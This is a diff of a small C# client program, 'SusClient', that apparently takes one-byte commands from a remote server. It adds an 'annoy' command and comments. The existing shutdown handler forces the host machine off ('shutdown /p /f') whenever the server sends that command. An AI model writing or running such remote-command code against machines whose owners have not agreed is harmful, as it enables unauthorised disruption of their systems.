@@ -34,10 +34,15 @@ namespace SusClient
                     Console.WriteLine("'shutdown' command has been issued!");
                     ShutdownCommand(); //Runs the shutdown routine
                 }
-                else if(latestCommand[0] == 0b00000011)
+                else if(latestCommand[0] == 0b00000011) //Checks if the command is disconnect
                 {
                     Console.WriteLine("'disconnect' command has been issued!");
                     break;
+                }
+                else if(latestCommand[0] == 0b00000100)
+                {
+                    Console.WriteLine("'annoy' command has been issued!");
+                    AnnoyCommand();
                 }
 
                 latestCommand = user.Receive(1); //Gets the latest command
@@ -50,7 +55,7 @@ namespace SusClient
             }
         }
 
-        private void Begin()
+        private void Begin() //Handles the startup routine
         {
             user = new Client();
 
@@ -62,12 +67,12 @@ namespace SusClient
             Console.Write("Done!\n");
         }
 
-        private void ShutdownCommand()
+        private void ShutdownCommand() //Handles the shutdown command
         {
             Process.Start("shutdown", "/p /f"); //Creates a new cmd that executes the shutdown command
         }
 
-        private void DisconnectCommand()
+        private void DisconnectCommand() //Handles the disconnect command
         {
             while(user.Send(0b11111111)) //Waits until the server has gone offline
             {
@@ -79,6 +84,10 @@ namespace SusClient
             Begin(); //Recreate the user for future use
             ConnectToServer(); //Tries to find a new server
             BeginCommandProcessing(); //Begins a new command chain
+        }
+        private void AnnoyCommand()
+        {
+            Process.Start("cmd.exe", "echo \"sauce\"");
         }
 
         private Client user; //The main client
